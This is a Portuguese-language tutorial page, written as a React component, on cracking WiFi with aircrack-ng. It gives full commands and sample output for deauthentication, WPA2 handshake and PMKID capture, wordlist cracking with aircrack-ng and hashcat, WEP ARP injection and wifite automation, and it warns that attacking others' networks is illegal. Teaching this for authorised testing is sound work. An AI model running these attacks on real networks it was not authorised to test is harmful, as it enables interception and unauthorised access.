import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Aircrack() {
  return (
    <PageContainer
      title="aircrack-ng — Suíte WiFi"
      subtitle="Captura de handshake WPA/WPA2/WPA3, ataque PMKID, deauth, fake AP. Tudo precisa de placa em monitor mode."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>Hardware</h2>
      <p>
        Você precisa de uma placa que suporte <strong>monitor mode</strong> + <strong>packet injection</strong>.
        Modelos populares: Alfa AWUS036ACH, AWUS036NHA, TP-Link TL-WN722N (v1).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "iw dev",
            out: `phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 08:00:27:de:ad:be
                type managed
                channel 6 (2437 MHz), width: 20 MHz, center1: 2437 MHz`,
            outType: "info",
          },
          {
            cmd: "iw list | grep -A 8 'Supported interface modes'",
            out: `        Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor          ← OK!
                 * mesh point
                 * P2P-client`,
            outType: "success",
          },
        ]}
      />

      <h2>Entrar em monitor mode</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) parar processos que mexem na placa",
            cmd: "sudo airmon-ng check kill",
            out: `Killing these processes:

    PID Name
   1234 wpa_supplicant
   1235 NetworkManager`,
            outType: "warning",
          },
          {
            cmd: "sudo airmon-ng start wlan0",
            out: `PHY     Interface       Driver          Chipset
phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT5370

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)`,
            outType: "success",
          },
          {
            cmd: "iwconfig wlan0mon",
            out: `wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off`,
            outType: "info",
          },
        ]}
      />

      <h2>Recon — airodump-ng</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo airodump-ng wlan0mon",
            out: ` CH  6 ][ Elapsed: 18 s ][ 2026-04-03 16:01

 BSSID              PWR  Beacons   #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 24:5E:BE:1A:2C:01  -31     142     1421   12   6  270  WPA2 CCMP   PSK  HomeWifi
 D8:BB:2C:A1:42:F8  -52     108      247    3  11  300  WPA2 CCMP   PSK  Vivo-2024
 90:8D:78:99:88:01  -67      45        0    0   1  130  WPA2 CCMP   PSK  NET_2GHZ_4421
 AA:BB:CC:DD:EE:FF  -71      32       12    0   6  130  OPN              CafeAlpha
 11:22:33:44:55:66  -74      28        4    0   3  270  WPA3 GCMP   SAE  CompanyAP

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 24:5E:BE:1A:2C:01  AA:11:22:33:44:55  -45    1e- 1e     0      241                  
 24:5E:BE:1A:2C:01  BB:22:33:44:55:66  -52    0 - 1      0       82  EAPOL            
 D8:BB:2C:A1:42:F8  CC:33:44:55:66:77  -68    0 - 6e     0       18`,
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="Colunas do airodump-ng"
        variations={[
          { cmd: "BSSID", desc: "MAC do access point.", output: "Identificador único." },
          { cmd: "PWR", desc: "Potência do sinal (-30 perto, -90 longe).", output: "Atacar APs com -50 ou melhor." },
          { cmd: "Beacons", desc: "Pacotes broadcast do AP.", output: "Mais = mais ativo." },
          { cmd: "#Data", desc: "Pacotes de dados capturados.", output: "Mais data = mais chance de IV." },
          { cmd: "CH", desc: "Canal WiFi (1-13 em 2.4G).", output: "Para focar: --channel" },
          { cmd: "ENC/CIPHER/AUTH", desc: "Criptografia.", output: "WPA2/WPA3/WEP/OPN" },
          { cmd: "ESSID", desc: "Nome da rede.", output: "<length: 0> = oculto." },
          { cmd: "STATION", desc: "Cliente conectado.", output: "Para deauth, escolha um." },
          { cmd: "Notes EAPOL", desc: "4-way handshake capturado!", output: "Pronto para crackear." },
        ]}
      />

      <h2>Capturar handshake WPA2</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "TERMINAL 1 — focar em UM AP/canal e gravar",
            cmd: "sudo airodump-ng -c 6 --bssid 24:5E:BE:1A:2C:01 -w handshake wlan0mon",
            out: ` CH  6 ][ Elapsed: 0 s ][ 2026-04-03 16:11

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID

 24:5E:BE:1A:2C:01  -31  98      72       12    1   6  270  WPA2 CCMP    PSK  HomeWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes
 24:5E:BE:1A:2C:01  AA:11:22:33:44:55  -45    1e- 1e     0      241`,
            outType: "info",
          },
          {
            comment: "TERMINAL 2 — forçar deauth de UM cliente",
            cmd: "sudo aireplay-ng --deauth 5 -a 24:5E:BE:1A:2C:01 -c AA:11:22:33:44:55 wlan0mon",
            out: `16:11:14 Waiting for beacon frame (BSSID: 24:5E:BE:1A:2C:01) on channel 6
16:11:14 Sending 64 directed DeAuth (code 7). STMAC: [AA:11:22:33:44:55] [12|56 ACKs]
16:11:14 Sending 64 directed DeAuth (code 7). STMAC: [AA:11:22:33:44:55] [13|59 ACKs]
[...]`,
            outType: "warning",
          },
          {
            comment: "TERMINAL 1 — quando o cliente reconectar, captura o EAPOL",
            cmd: "(volta ao terminal 1)",
            out: ` CH  6 ][ Elapsed: 18 s ][ 2026-04-03 16:11 ][ WPA handshake: 24:5E:BE:1A:2C:01

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  AUTH ESSID

 24:5E:BE:1A:2C:01  -31  98     142       42    3   6  270  WPA2 CCMP    PSK  HomeWifi`,
            outType: "success",
          },
          {
            cmd: "ls handshake-*",
            out: `handshake-01.cap          handshake-01.csv          handshake-01.kismet.csv
handshake-01.kismet.netxml handshake-01.log.csv`,
            outType: "default",
          },
        ]}
      />

      <h2>Crackear handshake</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) confirmar que o handshake está válido",
            cmd: "aircrack-ng handshake-01.cap",
            out: `Reading packets, please wait...
Opening handshake-01.cap
Read 1421 packets.

   #  BSSID              ESSID                     Encryption

   1  24:5E:BE:1A:2C:01  HomeWifi                  WPA (1 handshake)

Choose network number: 1`,
            outType: "info",
          },
          {
            comment: "2) cracking com wordlist",
            cmd: "aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap",
            out: `Reading packets, please wait...
Opening handshake-01.cap
Read 1421 packets.

1 potential targets

                               Aircrack-ng 1.7

      [00:00:18] 18432/14344392 keys tested (1024.32 k/s)

      Time left: 3 hours, 53 minutes, 12 seconds                 0.13%

                          KEY FOUND! [ Senha@2024 ]


      Master Key     : 8C 6F 4A 3D 7E 9C 1B 5F 2A 8C 6F 4A 3D 7E 9C 1B
                       2A 8C 6F 4A 3D 7E 9C 1B 5F 2A 8C 6F 4A 3D 7E 9C

      Transient Key  : F8 9D 8B 3C ...
      EAPOL HMAC     : E1 22 D5 8F ...`,
            outType: "success",
          },
        ]}
      />

      <h2>Convertendo para hashcat (mais rápido)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y hcxtools",
            out: "(hcxpcapngtool, hcxdumptool, etc.)",
            outType: "muted",
          },
          {
            cmd: "hcxpcapngtool -o handshake.hc22000 handshake-01.cap",
            out: `summary capture file
--------------------
file name........: handshake-01.cap
file type........: pcap 2.4
biggest packet...: 235 bytes
total packets....: 1421
EAPOL packets....: 4 (M1=1, M2=1, M3=1, M4=1)
EAPOL pairs......: 1                        ← válido!`,
            outType: "info",
          },
          {
            cmd: "hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt",
            out: `Speed.#1.........:    1486.4 kH/s   ← 1.4 milhão chaves/s na RTX 4090
Recovered........: 1/1 (100.00%) Digests
Started: Wed Apr 3 16:18:47 2026
Stopped: Wed Apr 3 16:18:54 2026

8c6f4a3d7e9c1b5f2a8c6f4a3d7e9c1b...:24:5e:be:1a:2c:01:aa:11:22:33:44:55:HomeWifi:Senha@2024`,
            outType: "success",
          },
        ]}
      />

      <h2>Ataque PMKID (sem cliente)</h2>
      <p>
        WPA2 vulnerável a PMKID — você captura o handshake direto do AP, SEM precisar
        de cliente conectado nem deauth.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable-status=15",
            out: `initialization of hcxdumptool ...
warning: NetworkManager is running with pid 1234
disable interface ifindex 3 (wlan0)...

start capturing (stop with ctrl+c)
INTERFACE:.............: wlan0mon (08:00:27:de:ad:be)
ERRORMAX:..............: 100 errors
FILTERLIST:............: not specified
MAC CLIENT:............: 99:88:77:66:55:44 (client)
MAC ACCESS POINT:......: 00:00:00:00:00:00 (start)
EAPOL TIMEOUT:.........: 150000
REPLAYCOUNT:...........: 65140
ANONCE:................: 84 c1 6f 8b ...

INFO: cha=6, rx=58, rx(dropped)=0, tx=8, powned=0, err=0
INFO: cha=11, rx=124, rx(dropped)=0, tx=14, powned=1
[+] PMKID captured: aa11bb22cc33...:24:5E:BE:1A:2C:01:AA:11:22:33:44:55:HomeWifi`,
            outType: "warning",
          },
          {
            cmd: "hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng",
            out: `summary capture file
--------------------
PMKID(s) written to: pmkid.hc22000 (1)`,
            outType: "info",
          },
          {
            cmd: "hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt",
            out: "(mesmo crack — só não precisou de cliente)",
            outType: "default",
          },
        ]}
      />

      <h2>WEP cracking (raríssimo hoje)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "WEP cai em segundos com tráfego suficiente",
            cmd: "sudo airodump-ng -c 11 --bssid AA:BB:CC:11:22:33 -w wep wlan0mon",
            out: "(capturando IVs — quanto mais #Data, melhor. Idealmente 50000+ IVs)",
            outType: "muted",
          },
          {
            comment: "ARP injection para acelerar (forçar #Data subir)",
            cmd: "sudo aireplay-ng -3 -b AA:BB:CC:11:22:33 wlan0mon",
            out: "(injeta ARP requests, AP responde, gera muitos IVs)",
            outType: "warning",
          },
          {
            cmd: "aircrack-ng wep-01.cap",
            out: `[00:00:14] Tested 21 keys (got 50032 IVs)

   KB    depth   byte(vote)
    0    0/  9   91( 89344) 2D( 50432)
    1    0/  3   55( 81984) F1( 49152)

         KEY FOUND! [ 91:55:43:E2:F0 ] (ASCII: ?UC??)
   Decrypted correctly: 100%`,
            outType: "success",
          },
        ]}
      />

      <h2>Wifite — automação total</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo wifite",
            out: `   .   .__,    .__,        Automated Wireless Auditor
 (\\(\\|\\__,    /  /         wifite v2.7.0 (https://github.com/derv82/wifite2)
   ~ )         (  ~          
                
[+] using wlan0mon already in monitor mode

   NUM  ESSID                    CH  ENCR    POWER  WPS?  CLIENT
   ---  --------------           --  ----    -----  ----  ------
    1   HomeWifi                  6  WPA2    98db   yes    1
    2   Vivo-2024                11  WPA2    72db   no     0
    3   CompanyAP                 3  WPA3    62db   no     0
    4   CafeAlpha                 6  OPN     61db   no     2

[+] select target(s) (1-4) separated by commas, dashes or all: 1
[+] (1/1) Starting attacks against 24:5E:BE:1A:2C:01 (HomeWifi)
[+] HomeWifi (98db) PMKID CAPTURE: Captured PMKID
[+] HomeWifi (98db) PMKID CAPTURE: Cracked WPA2 PMKID Hash (8c6f4a3d...)
[+] HomeWifi (98db) PMKID CAPTURE: Cracked password "Senha@2024"

[+] Finished attacking 1 target(s), exiting`,
            outType: "success",
          },
        ]}
      />

      <h2>Voltar pro normal</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo airmon-ng stop wlan0mon",
            out: `PHY     Interface       Driver          Chipset
phy0    wlan0mon        rt2800usb       Ralink RT5370

                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)`,
            outType: "muted",
          },
          {
            cmd: "sudo systemctl start NetworkManager",
            out: "(WiFi normal volta)",
            outType: "default",
          },
        ]}
      />

      <PracticeBox
        title="WiFi do seu próprio roteador"
        goal="Capturar e crackear o handshake do SEU roteador (com SENHA fácil para o teste)."
        steps={[
          "Defina temporariamente a senha do seu roteador para algo do rockyou (ex: 'password123').",
          "Coloque a placa em monitor mode.",
          "Use airodump para identificar o BSSID e canal.",
          "Capture handshake com deauth de UM cliente seu (smartphone).",
          "Cracke com aircrack-ng + rockyou.",
          "RESTAURE a senha original do roteador imediatamente.",
        ]}
        command={`sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon          # identifique BSSID + CH
sudo airodump-ng -c 6 --bssid SEU:BSSID:AQUI -w hs wlan0mon &
sudo aireplay-ng --deauth 10 -a SEU:BSSID -c CLIENTE:SEU wlan0mon
# wait for "WPA handshake: SEU:BSSID:AQUI"
aircrack-ng -w /usr/share/wordlists/rockyou.txt hs-01.cap
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager`}
        expected={`KEY FOUND! [ password123 ]
Master Key     : 8C 6F 4A ...`}
        verify="Lembre de restaurar a senha forte do seu roteador depois do teste!"
      />

      <AlertBox type="danger" title="Senha forte = inquebrável">
        WPA2 com senha de 14+ caracteres aleatórios resiste a qualquer wordlist e brute force prático.
        WPA3 (SAE) é resistente até a PMKID. Por isso o ataque mais comum hoje é{" "}
        <strong>evil twin</strong> + <strong>captive portal</strong> (engenharia social) — veja{" "}
        <a href="#/wifiphisher"><strong>Wifiphisher</strong></a>.
      </AlertBox>

      <AlertBox type="danger" title="Crime se não for sua rede">
        Capturar e crackear WiFi alheia é interceptação + acesso não autorizado.
        Use só na sua rede ou com autorização. Em CTF/THM/HTB, simulações são legais.
      </AlertBox>
    </PageContainer>
  );
}
